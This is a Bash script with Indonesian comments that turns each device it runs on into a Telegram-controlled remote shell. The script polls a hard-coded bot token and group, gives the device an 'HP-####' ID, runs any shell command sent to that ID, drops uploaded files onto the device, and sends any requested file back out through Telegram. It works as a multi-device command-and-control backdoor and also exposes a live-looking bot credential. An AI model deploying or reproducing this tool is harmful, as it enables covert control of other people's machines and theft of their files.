#!/bin/bash

# --- CONFIGURATION ---
BOT_TOKEN="8160257583:AAGsIgZhELLEJ-ZLmNR5FUxX2DSgx8HENz4"
# ⚠️ WAJIB DIGANTI: Ganti dengan ID Grup Telegram lu (biasanya diawali tanda minus, misal: -100xxxxxxxxx)
ALLOWED_CHAT_ID="-1004321325929"

ID_FILE="$HOME/.bot_agent_id.txt"
MSG_LOG="$HOME/.bot_msg_history.txt"

# --- GENERATE NAMA RANDOM OTOMATIS ---
if [ ! -f "$ID_FILE" ]; then
    RANDOM_NUM=$((1000 + RANDOM % 9000))
    echo "HP-${RANDOM_NUM}" > "$ID_FILE"
fi
AGENT_ID=$(cat "$ID_FILE")

# Jika file history pesan belum ada, buat baru
touch "$MSG_LOG"
# -------------------------------------

CMD_TIMEOUT=15
CMD_BUFFER="$HOME/.bash_cmd.sh"
OUT_BUFFER="$HOME/.bash_out.txt"
DIR_BUFFER="$HOME/.bash_dir.txt"

if [ ! -f "$DIR_BUFFER" ]; then
    echo "$HOME" > "$DIR_BUFFER"
fi

echo "Pro Bash Shell V6 (Sistem Grup - Anti Bentrok) Aktif..."
echo "Device ID Lu: $AGENT_ID"

while true; do
    # Kita panggil getUpdates TANPA offset agar semua HP bisa melihat 100 pesan terakhir di grup secara bersamaan
    UPDATES=$(curl -s --max-time 5 "https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=100")
    
    # Abaikan error conflict 409 jika sesekali request-nya bertabrakan di detik yang sama
    if echo "$UPDATES" | grep -q '"error_code":409'; then
        sleep $((1 + RANDOM % 2))
        continue
    fi

    echo "$UPDATES" | jq -c '.result[]' 2>/dev/null | while read -r UPDATE; do
        CHAT_ID=$(echo "$UPDATE" | jq -r '.message.chat.id // empty')
        MSG_ID=$(echo "$UPDATE" | jq -r '.message.message_id // empty')
        TEXT=$(echo "$UPDATE" | jq -r '.message.text // empty')
        DOCUMENT_ID=$(echo "$UPDATE" | jq -r '.message.document.file_id // empty')

        # Validasi grup
        if [ "$CHAT_ID" != "$ALLOWED_CHAT_ID" ]; then continue; fi
        if [ -z "$MSG_ID" ]; then continue; fi

        # Cek apakah HP ini sudah pernah memproses Message ID ini sebelumnya
        if grep -q "^${MSG_ID}$" "$MSG_LOG"; then
            continue
        fi

        # Catat MSG_ID ke log lokal agar tidak dieksekusi ulang di masa depan
        echo "$MSG_ID" >> "$MSG_LOG"

        # Batasi ukuran file log lokal agar tidak bengkak (simpan 500 pesan terakhir saja)
        if [ $(wc -l < "$MSG_LOG") -gt 500 ]; then
            tail -n 200 "$MSG_LOG" > "${MSG_LOG}.tmp" && mv "${MSG_LOG}.tmp" "$MSG_LOG"
        fi

        # =========================================================
        # 1. FITUR UTAMA: CEK DEVICE YANG AKTIF / ONLINE
        # =========================================================
        if [ "$TEXT" == "/devices" ] || [ "$TEXT" == "/start" ]; then
            INFO_MSG="🤖 <b>Device Online:</b> <code>$AGENT_ID</code>%0A📍 Dir: <code>$(cat $DIR_BUFFER)</code>%0A%0A<i>Gunakan: <code>/$AGENT_ID [perintah]</code> untuk kontrol device ini.</i>"
            curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
                -d "chat_id=${CHAT_ID}" -d "parse_mode=HTML" -d "text=$INFO_MSG" > /dev/null
            continue
        fi

        # =========================================================
        # VALIDASI MULTI-DEVICE (Format: /NamaDevice perintah)
        # =========================================================
        if [[ "$TEXT" == "/${AGENT_ID}"* ]]; then
            TEXT=$(echo "$TEXT" | sed "s|^\/${AGENT_ID}||" | sed 's/^ //')
            if [ -z "$TEXT" ]; then
                curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
                    -d "chat_id=${CHAT_ID}" -d "text=Device $AGENT_ID siap! Masukkan perintah setelah nama device bray." > /dev/null
                continue
            fi
        else
            continue
        fi

        # =========================================================
        # 2. FITUR UPLOAD FILE
        # =========================================================
        if [ -n "$DOCUMENT_ID" ]; then
            FILE_NAME=$(echo "$UPDATE" | jq -r '.message.document.file_name')
            CURRENT_DIR=$(cat "$DIR_BUFFER")
            
            curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" -d "chat_id=${CHAT_ID}" -d "text=[$AGENT_ID] Mengunduh $FILE_NAME ..." > /dev/null
            
            FILE_PATH_URL=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${DOCUMENT_ID}" | jq -r '.result.file_path')
            curl -s "https://api.telegram.org/file/bot${BOT_TOKEN}/${FILE_PATH_URL}" -o "${CURRENT_DIR}/${FILE_NAME}"
            
            curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" -d "chat_id=${CHAT_ID}" -d "text=[$AGENT_ID] Selesai disimpan bray!" > /dev/null
            continue
        fi

        # =========================================================
        # 3. FITUR DOWNLOAD FILE
        # =========================================================
        if [[ "$TEXT" == get* ]]; then
            FILE_TO_SEND=$(echo "$TEXT" | sed 's/get //')
            if [[ "$FILE_TO_SEND" != /* ]]; then
                FILE_TO_SEND="$(cat "$DIR_BUFFER")/$FILE_TO_SEND"
            fi

            if [ -f "$FILE_TO_SEND" ]; then
                curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" -F "chat_id=${CHAT_ID}" -F "document=@${FILE_TO_SEND}" > /dev/null
            else
                curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" -d "chat_id=${CHAT_ID}" -d "text=[$AGENT_ID] File kaga ada bray!" > /dev/null
            fi
            continue
        fi

        # =========================================================
        # 4. EXECUTOR SHELL
        # =========================================================
        curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendChatAction" -d "chat_id=${CHAT_ID}" -d "action=typing" > /dev/null
        
        CURRENT_DIR=$(cat "$DIR_BUFFER")
        echo "cd '$CURRENT_DIR' 2>/dev/null" > "$CMD_BUFFER"
        echo "$TEXT" >> "$CMD_BUFFER"
        echo "pwd > '$DIR_BUFFER'" >> "$CMD_BUFFER"
        
        timeout $CMD_TIMEOUT bash "$CMD_BUFFER" > "$OUT_BUFFER" 2>&1
        EXIT_CODE=$?
        
        OUTPUT=$(cat "$OUT_BUFFER")
        PREFIX_DIR=$(cat "$DIR_BUFFER")

        if [ $EXIT_CODE -eq 124 ]; then
            OUTPUT="⚠️ Perintah di-Killed karena timeout ${CMD_TIMEOUT} detik!%0AOutput terakhir:%0A$OUTPUT"
        elif [ -z "$OUTPUT" ]; then
            OUTPUT="Perintah dieksekusi di: $PREFIX_DIR"
        fi

        SAFE_OUTPUT=$(echo "$OUTPUT" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')

        curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d "chat_id=${CHAT_ID}" \
            -d "parse_mode=HTML" \
            --data-urlencode "text=<b>[$AGENT_ID] $PREFIX_DIR</b>%0A<pre>$SAFE_OUTPUT</pre>" > /dev/null
    done

    sleep 2
done
